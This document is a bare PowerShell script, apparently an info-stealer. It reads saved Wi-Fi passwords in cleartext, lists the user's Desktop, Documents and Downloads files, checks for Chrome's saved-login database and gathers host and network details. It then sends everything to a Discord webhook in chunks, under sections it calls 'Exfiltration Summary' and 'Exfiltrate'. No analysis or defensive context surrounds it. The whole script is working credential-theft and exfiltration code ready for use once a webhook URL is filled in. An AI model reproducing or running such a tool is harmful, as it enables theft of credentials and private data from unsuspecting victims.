$webhook_url = "DISCORD_WEBHOOK_URL"  # Replace with your Discord webhook URL

# ===== Functions =====
function Get-WiFiProfiles {
    $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
        ($_ -split ":")[1].Trim()
    }
    $wifiData = @()
    foreach ($profile in $profiles) {
        $key = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content" | ForEach-Object {
            ($_ -split ":")[1].Trim()
        }
        $wifiData += [pscustomobject]@{SSID=$profile;Password=($key -join ",")}
    }
    return $wifiData
}

function Get-FilesData {
    $desktop = [Environment]::GetFolderPath("Desktop")
    $documents = [Environment]::GetFolderPath("MyDocuments")

    # Get Downloads folder path from the user profile directory
    $downloads = Join-Path -Path $env:USERPROFILE -ChildPath "Downloads"

    $folders = @($desktop, $documents, $downloads)
    $filesInfo = @()
    foreach ($folder in $folders) {
        if (Test-Path $folder) {
            $files = Get-ChildItem -Path $folder -File -ErrorAction SilentlyContinue | Select-Object Name, Length, LastWriteTime
            $filesInfo += $files
        }
    }
    return $filesInfo
}

function Get-ChromePasswords {
    $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    if (Test-Path $chromePath) {
        return "Chrome Login Data file found at $chromePath"
    } else {
        return "No Chrome password data found"
    }
}

# ===== Collect data =====
$data = @{
    "WiFiProfiles" = Get-WiFiProfiles
    "FilesInfo" = Get-FilesData
    "ChromePasswords" = Get-ChromePasswords
    "MachineName" = $env:COMPUTERNAME
    "UserName" = $env:USERNAME
    "Timestamp" = (Get-Date).ToString("u")
    "OS Version" = (Get-CimInstance Win32_OperatingSystem).Caption
    "IP Config" = (ipconfig)
    "Hostname" = (hostname)
    "User" = (whoami)
}

$json = $data | ConvertTo-Json -Depth 5

$summary = @{
    "WiFi Profiles" = ($data.WiFiProfiles | Measure-Object).Count
    "Files Found" = ($data.FilesInfo | Measure-Object).Count
    "Chrome Passwords Status" = $data.ChromePasswords
    "Machine Name" = $data.MachineName
    "User Name" = $data.UserName
    "Timestamp" = $data.Timestamp
}

# Build the embed object for Discord webhook
$embed = @{
    embeds = @(@{
        title = "Exfiltration Summary"
        color = 16711680  # Red color, you can change it
        fields = @(
            @{name="WiFi Profiles"; value="$($summary.'WiFi Profiles') found"; inline=$true}
            @{name="Files Found"; value="$($summary.'Files Found') files"; inline=$true}
            @{name="Chrome Passwords"; value="$($summary.'Chrome Passwords Status')"; inline=$false}
            @{name="Machine Name"; value="$($summary.'Machine Name')"; inline=$true}
            @{name="User Name"; value="$($summary.'User Name')"; inline=$true}
            @{name="Timestamp"; value="$($summary.'Timestamp')"; inline=$false}
        )
    })
}
# ===== Exfiltrate ====

# Summary
Invoke-RestMethod -Uri $webhook_url -Method POST -Body ($embed | ConvertTo-Json -Depth 4) -ContentType "application/json"

function Send-DiscordPayload {
    param (
        [string]$webhook_url,
        [string]$data
    )

    $maxLength = 1800
    $chunks = @()

    for ($i = 0; $i -lt $data.Length; $i += $maxLength) {
        $length = [Math]::Min($maxLength, $data.Length - $i)
        $chunks += $data.Substring($i, $length)
    }

    foreach ($chunk in $chunks) {
        $jsonPayload = @{ content = "```$chunk``` " } | ConvertTo-Json
        Invoke-RestMethod -Uri $webhook_url -Method POST -Body $jsonPayload -ContentType "application/json"
        Start-Sleep -Seconds 1
    }
}

Send-DiscordPayload -webhook_url $webhook_url -data $json
